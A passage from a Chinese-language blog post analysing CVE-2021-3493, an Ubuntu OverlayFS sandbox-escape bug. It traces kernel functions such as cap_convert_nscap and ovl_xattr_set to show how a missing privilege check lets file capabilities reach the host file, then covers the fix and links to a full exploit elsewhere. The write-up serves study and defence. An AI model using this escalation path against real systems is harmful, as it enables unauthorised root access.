+</span></span></code></pre></div><p>所以在 28 行处的判断最后会进入 else if 中，执行 cap_convert_nscap 函数，这个函数的实现为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>cap_convert_nscap</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>dentry</span> <span style=color:#666>*</span>dentry, <span style=color:#902000>void</span> <span style=color:#666>**</span>ivalue, size_t size)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>vfs_ns_cap_data</span> <span style=color:#666>*</span>nscap;
+</span></span><span style=display:flex><span>	uid_t nsrootid;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>vfs_cap_data</span> <span style=color:#666>*</span>cap <span style=color:#666>=</span> <span style=color:#666>*</span>ivalue;
+</span></span><span style=display:flex><span>	__u32 magic, nsmagic;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>inode</span> <span style=color:#666>*</span>inode <span style=color:#666>=</span> d_backing_inode(dentry);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>user_namespace</span> <span style=color:#666>*</span>task_ns <span style=color:#666>=</span> current_user_ns(),
+</span></span><span style=display:flex><span>		<span style=color:#666>*</span>fs_ns <span style=color:#666>=</span> inode<span style=color:#666>-&gt;</span>i_sb<span style=color:#666>-&gt;</span>s_user_ns;
+</span></span><span style=display:flex><span>	kuid_t rootid;
+</span></span><span style=display:flex><span>	size_t newsize;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!*</span>ivalue)
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>validheader(size, cap))
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>capable_wrt_inode_uidgid(inode, CAP_SETFCAP))
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EPERM;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (size <span style=color:#666>==</span> XATTR_CAPS_SZ_2)
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (ns_capable(inode<span style=color:#666>-&gt;</span>i_sb<span style=color:#666>-&gt;</span>s_user_ns, CAP_SETFCAP))
+</span></span><span style=display:flex><span>			<span style=color:#60a0b0;font-style:italic>/* user is privileged, just write the v2 */</span>
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>return</span> size;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	rootid <span style=color:#666>=</span> rootid_from_xattr(<span style=color:#666>*</span>ivalue, size, task_ns);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>uid_valid(rootid))
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	nsrootid <span style=color:#666>=</span> from_kuid(fs_ns, rootid);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nsrootid <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	newsize <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>vfs_ns_cap_data</span>);
+</span></span><span style=display:flex><span>	nscap <span style=color:#666>=</span> kmalloc(newsize, GFP_ATOMIC);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>nscap)
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>ENOMEM;
+</span></span><span style=display:flex><span>	nscap<span style=color:#666>-&gt;</span>rootid <span style=color:#666>=</span> cpu_to_le32(nsrootid);
+</span></span><span style=display:flex><span>	nsmagic <span style=color:#666>=</span> VFS_CAP_REVISION_3;
+</span></span><span style=display:flex><span>	magic <span style=color:#666>=</span> le32_to_cpu(cap<span style=color:#666>-&gt;</span>magic_etc);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (magic <span style=color:#666>&amp;</span> VFS_CAP_FLAGS_EFFECTIVE)
+</span></span><span style=display:flex><span>		nsmagic <span style=color:#666>|=</span> VFS_CAP_FLAGS_EFFECTIVE;
+</span></span><span style=display:flex><span>	nscap<span style=color:#666>-&gt;</span>magic_etc <span style=color:#666>=</span> cpu_to_le32(nsmagic);
+</span></span><span style=display:flex><span>	memcpy(<span style=color:#666>&amp;</span>nscap<span style=color:#666>-&gt;</span>data, <span style=color:#666>&amp;</span>cap<span style=color:#666>-&gt;</span>data, <span style=color:#007020;font-weight:700>sizeof</span>(__le32) <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#666>*</span> VFS_CAP_U32);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	kvfree(<span style=color:#666>*</span>ivalue);
+</span></span><span style=display:flex><span>	<span style=color:#666>*</span>ivalue <span style=color:#666>=</span> nscap;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> newsize;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>注意 19 行处，我们提供的 cap 参数是满足这里的判断的，所以会执行 ns_capable，这个函数做的就是检测当前线程是否有足够的特权。实际调用的 ns_capable_common，实现为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>bool</span> <span style=color:#06287e>ns_capable_common</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>user_namespace</span> <span style=color:#666>*</span>ns,
+</span></span><span style=display:flex><span>			      <span style=color:#902000>int</span> cap,
+</span></span><span style=display:flex><span>			      <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> opts)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> capable;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (unlikely(<span style=color:#666>!</span>cap_valid(cap))) {
+</span></span><span style=display:flex><span>		pr_crit(<span style=color:#4070a0>&#34;capable() called with invalid cap=%u</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, cap);
+</span></span><span style=display:flex><span>		BUG();
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	capable <span style=color:#666>=</span> security_capable(current_cred(), ns, cap, opts);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (capable <span style=color:#666>==</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>		current<span style=color:#666>-&gt;</span>flags <span style=color:#666>|=</span> PF_SUPERPRIV;
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>true</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>false</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>可见是通过 security_capable 这个函数来检测的，检测的就是当前线程在当前名称空间下的特权级是否有设置 cap 的权限。之前我们设置了 uid_map 和 gid_map，这个检测是可以通过的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (ns_capable(inode<span style=color:#666>-&gt;</span>i_sb<span style=color:#666>-&gt;</span>s_user_ns, CAP_SETFCAP))
+</span></span><span style=display:flex><span>			<span style=color:#60a0b0;font-style:italic>/* user is privileged, just write the v2 */</span>
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>return</span> size;
+</span></span></code></pre></div><p>正如注释中所说，检测后说明用户权限足够，就把 cap 写到文件的 xattr 中，这是之后调用的 vfs_setxattr 做的事，该函数的实现如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span>
+</span></span><span style=display:flex><span><span style=color:#06287e>vfs_setxattr</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>dentry</span> <span style=color:#666>*</span>dentry, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>name, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>void</span> <span style=color:#666>*</span>value,
+</span></span><span style=display:flex><span>		size_t size, <span style=color:#902000>int</span> flags)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>inode</span> <span style=color:#666>*</span>inode <span style=color:#666>=</span> dentry<span style=color:#666>-&gt;</span>d_inode;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>inode</span> <span style=color:#666>*</span>delegated_inode <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> error;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>retry_deleg</span>:
+</span></span><span style=display:flex><span>	inode_lock(inode);
+</span></span><span style=display:flex><span>	error <span style=color:#666>=</span> __vfs_setxattr_locked(dentry, name, value, size, flags,
+</span></span><span style=display:flex><span>	    <span style=color:#666>&amp;</span>delegated_inode);
+</span></span><span style=display:flex><span>	inode_unlock(inode);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (delegated_inode) {
+</span></span><span style=display:flex><span>		error <span style=color:#666>=</span> break_deleg_wait(<span style=color:#666>&amp;</span>delegated_inode);
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>error)
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>goto</span> retry_deleg;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> error;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>EXPORT_SYMBOL_GPL(vfs_setxattr);
+</span></span></code></pre></div><p>一路调用下去会执行到</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>xattr_handler</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#06287e>xattr_resolve_name</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>inode</span> <span style=color:#666>*</span>inode, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>**</span>name)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>xattr_handler</span> <span style=color:#666>**</span>handlers <span style=color:#666>=</span> inode<span style=color:#666>-&gt;</span>i_sb<span style=color:#666>-&gt;</span>s_xattr;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>xattr_handler</span> <span style=color:#666>*</span>handler;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>(inode<span style=color:#666>-&gt;</span>i_opflags <span style=color:#666>&amp;</span> IOP_XATTR)) {
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (unlikely(is_bad_inode(inode)))
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>return</span> ERR_PTR(<span style=color:#666>-</span>EIO);
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> ERR_PTR(<span style=color:#666>-</span>EOPNOTSUPP);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	for_each_xattr_handler(handlers, handler) {
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>n;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		n <span style=color:#666>=</span> strcmp_prefix(<span style=color:#666>*</span>name, xattr_prefix(handler));
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (n) {
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>handler<span style=color:#666>-&gt;</span>prefix <span style=color:#666>^</span> <span style=color:#666>!*</span>n) {
+</span></span><span style=display:flex><span>				<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>*</span>n)
+</span></span><span style=display:flex><span>					<span style=color:#007020;font-weight:700>continue</span>;
+</span></span><span style=display:flex><span>				<span style=color:#007020;font-weight:700>return</span> ERR_PTR(<span style=color:#666>-</span>EINVAL);
+</span></span><span style=display:flex><span>			}
+</span></span><span style=display:flex><span>			<span style=color:#666>*</span>name <span style=color:#666>=</span> n;
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>return</span> handler;
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> ERR_PTR(<span style=color:#666>-</span>EOPNOTSUPP);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这个函数根据文件的类型计算出了 handler，我们在调用 setxattr 执行之前，设置了一个 overlayfs，并把它挂载到了 <code>./exploit/merge</code> 中。而被设置 cap 的程序为 <code>./exploit/merge/get_root</code>，他就属于 overlayfs 文件系统了，inode 标识的就是 overlayfs。对于 overlayfs 自然调用的就是 ovl_xattr_set 了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>ovl_xattr_set</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>dentry</span> <span style=color:#666>*</span>dentry, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>inode</span> <span style=color:#666>*</span>inode, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>name,
+</span></span><span style=display:flex><span>		  <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>void</span> <span style=color:#666>*</span>value, size_t size, <span style=color:#902000>int</span> flags)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> err;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>dentry</span> <span style=color:#666>*</span>upperdentry <span style=color:#666>=</span> ovl_i_dentry_upper(inode);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>dentry</span> <span style=color:#666>*</span>realdentry <span style=color:#666>=</span> upperdentry <span style=color:#666>?:</span> ovl_dentry_lower(dentry);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>cred</span> <span style=color:#666>*</span>old_cred;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	err <span style=color:#666>=</span> ovl_want_write(dentry);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (err)
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>goto</span> out;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>value <span style=color:#666>&amp;&amp;</span> <span style=color:#666>!</span>upperdentry) {
+</span></span><span style=display:flex><span>		old_cred <span style=color:#666>=</span> ovl_override_creds(dentry<span style=color:#666>-&gt;</span>d_sb);
+</span></span><span style=display:flex><span>		err <span style=color:#666>=</span> vfs_getxattr(<span style=color:#666>&amp;</span>init_user_ns, realdentry, name, <span style=color:#007020>NULL</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>		revert_creds(old_cred);
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (err <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>goto</span> out_drop_write;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>upperdentry) {
+</span></span><span style=display:flex><span>		err <span style=color:#666>=</span> ovl_copy_up(dentry);
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (err)
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>goto</span> out_drop_write;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		realdentry <span style=color:#666>=</span> ovl_dentry_upper(dentry);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	old_cred <span style=color:#666>=</span> ovl_override_creds(dentry<span style=color:#666>-&gt;</span>d_sb);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (value)
+</span></span><span style=display:flex><span>		err <span style=color:#666>=</span> vfs_setxattr(<span style=color:#666>&amp;</span>init_user_ns, realdentry, name, value, size,
+</span></span><span style=display:flex><span>				   flags);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>else</span> {
+</span></span><span style=display:flex><span>		WARN_ON(flags <span style=color:#666>!=</span> XATTR_REPLACE);
+</span></span><span style=display:flex><span>		err <span style=color:#666>=</span> vfs_removexattr(<span style=color:#666>&amp;</span>init_user_ns, realdentry, name);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	revert_creds(old_cred);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>/* copy c/mtime */</span>
+</span></span><span style=display:flex><span>	ovl_copyattr(d_inode(realdentry), inode);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>out_drop_write</span>:
+</span></span><span style=display:flex><span>	ovl_drop_write(dentry);
+</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>out</span>:
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> err;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>进入函数后，根据 overlayfs 文件系统的特性，我们可以推断出来，upperdentry 就是 <code>./exploit/upper/get_root</code>，realdentry 也是。而 <code>./exploit/upper/get_root</code> 就是 ext3 文件系统下的提权二进制文件。这个函数会执行到 30 中的 if 中，再次调用 vfs_setxattr，这一次就是向沙盒外的二进制文件写 cap 了。一路上没有特权级检查，成功把沙盒外的 cap 改写了，然后执行该二进制就可以提权了。</p><p>完整的 exp 可以参考 <a href="https://www.pwnwiki.org/index.php?title=CVE-2021-3493_linux_kernel_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E">pwnwiki</a>。</p><h3 id=修复>修复</h3><p>回想一下，一次正常的 setxattr 操作，特权级检查是在什么时候做的？</p><p>答：就是在 setxattr 函数做的。并且在 vfs_setxattr 中并没有做二次检查。</p><p>那么修复的方法就是把判断移到 vfs_setxattr 中</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/3510477967.png></div><h3 id=后记>后记</h3><p>这个漏洞是 Ubuntu 独有的，因为在 Linux 内核主线中，普通用户是不能创建 overlayfs 的，但是 Ubuntu 中给予了普通用户这个权限，所以才出现了这个漏洞。</p><p>总结一下漏洞的原理就是：构造沙盒后，在新的 namespace 中有 root 权限，并且 overlayfs 的 merge 目录中的所有文件都是属于新的 namespace 的，文件类型为 overlayfs 文件。给 overlayfs 的 merge 目录中的文件设置 capabilities 自然是合法的，而在对这些文件写时会影响到 upper 目录中的私有 ext3 文件，在这里没有进行完整的权限检查导致了 root 权限的沙盒逃逸。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/1474850880.png></div><h3 id=参考>参考</h3><blockquote><p><a href=https://zhuanlan.zhihu.com/p/73248894>浅谈Linux Namespace机制（一）</a></p><p><a href=https://mp.weixin.qq.com/s/hG-0jae9fQpbDkH3YMSLdw>Ubuntu内核OverlayFS权限逃逸漏洞分析（CVE-2021-3493）</a></p><p><a href=https://blog.csdn.net/luckyapple1028/article/details/77916194>深入理解overlayfs（一）：初识</a></p><p><a href=https://cloud.tencent.com/developer/article/1529342>Linux Capabilities 入门：让普通进程获得 root 的洪荒之力</a></p><p><a href=https://blog.csdn.net/andyL_05/article/details/89877063>Ubuntu系统Linux内核升级、降级</a></p></blockquote></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/cve>cve</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
